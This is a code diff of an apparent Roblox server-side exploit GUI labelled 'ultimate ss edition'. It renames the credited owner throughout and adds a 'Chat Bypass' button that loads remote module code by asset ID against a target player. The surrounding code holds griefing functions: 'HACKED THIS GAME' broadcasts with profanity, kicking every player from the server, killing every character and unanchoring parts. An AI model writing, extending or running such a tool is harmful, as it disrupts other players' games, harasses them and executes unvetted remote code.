@@ -11,13 +11,13 @@ local ID_Main="rbxassetid://71983226245811"
 local ID_Part="rbxassetid://131552532497284"
 local ID_Jump="rbxassetid://132225475210716"
 local ID_Music="rbxassetid://138421944471718"
-if pGui:FindFirstChild("manusia_hitam60 (ultimate ss edition)") then pGui["manusia_hitam60 (ultimate ss edition)"]:Destroy() end
+if pGui:FindFirstChild("i_dontknow8938 (ultimate ss edition)") then pGui["i_dontknow8938 (ultimate ss edition)"]:Destroy() end
 local ScreenGui=Instance.new("ScreenGui",pGui)
-ScreenGui.Name="manusia_hitam60 (ultimate ss edition)"
+ScreenGui.Name="i_dontknow8938 (ultimate ss edition)"
 ScreenGui.ResetOnSpawn=false
 ScreenGui.DisplayOrder=999
     local legends = {
-    ["manusia_hitam60"] = "OWNER",
+    ["i_dontknow8938"] = "OWNER",
     ["kevinphone7"] = "THIS SCRIPT DESIGNED FOR YOU",
     ["V990one_c00lkizz"] = "HOPE YOU TRY IT MY FRIEND",
     ["Realoscarina"] = "THANK YOU FOR THE CHAT SCRIPT",
@@ -100,7 +100,7 @@ end
     end)
     local Title = Instance.new("TextLabel", MainFrame)
     Title.Size = UDim2.new(1, 0, 0, 35)
-    Title.Text = "  MANUSIA_HITAM60 (ULTIMATE SS EDITION)"
+    Title.Text = "  i_dontknow8938 (ULTIMATE SS EDITION)"
     Title.TextColor3 = Color3.new(0,0,0)
     Title.BackgroundTransparency = 1 Title.TextSize = 16
     Title.Font = "SourceSansBold" Title.TextXAlignment = "Left"
@@ -161,11 +161,11 @@ end
         end) end
     end)
     makeBtn("Message All", blue, function()
-        local m = Instance.new("Message", workspace) m.Text = "MANUSIA_HITAM60 HACKED THIS GAME LOL!!!🤟😝🤟"
+        local m = Instance.new("Message", workspace) m.Text = "i_dontknow8938 HACKED THIS GAME LOL!!!🤟😝🤟"
         task.delay(5, function() m:Destroy() end)
     end)
     makeBtn("Hint", blue, function()
-        local h = Instance.new("Hint", workspace) h.Text = "MANUSIA_HITAM60 HACKED THIS FUCKING GAME!!! 🤟😝🤟"
+        local h = Instance.new("Hint", workspace) h.Text = "i_dontknow8938 HACKED THIS FUCKING GAME!!! 🤟😝🤟"
         task.delay(9e9, function() h:Destroy() end)
     end)
     makeBtn("Unanchor All", blue, function()
@@ -191,7 +191,7 @@ end
             end
         end)
     end)
-    makeBtn("Shutdown", blue, function() for _, v in pairs(Players:GetPlayers()) do v:Kick("THE SERVER SHOUTDOWN BECAUSE MANUSIA_HITAM60!!! 🤟😝🤟") end end)
+    makeBtn("Shutdown", blue, function() for _, v in pairs(Players:GetPlayers()) do v:Kick("THE SERVER SHOUTDOWN BECAUSE i_dontknow8938!!!") end end)
     makeBtn("Kill All", green, function() for _, v in pairs(Players:GetPlayers()) do if v.Character then v.Character:BreakJoints() end end end)
         makeBtn("Disco", green, function() 
         task.spawn(function() game.Lighting.GlobalShadows = false
@@ -369,6 +369,16 @@ require(74641078403734).PROJECTTAC0Z(targetPlayer.Name)
 end)
 if not sukses then
 warn("Gagal load Project Taco: " .. pesanError)
+end
+end)
+end)
+makeBtn("Chat Bypass", black, function()
+task.spawn(function()
+local sukses, pesanError = pcall(function()
+require(7960756691).load(targetPlayer.Name)
+end)
+if not sukses then
+warn("Gagal load Chat Bypass: " .. pesanError)
 end
 end)
 end)
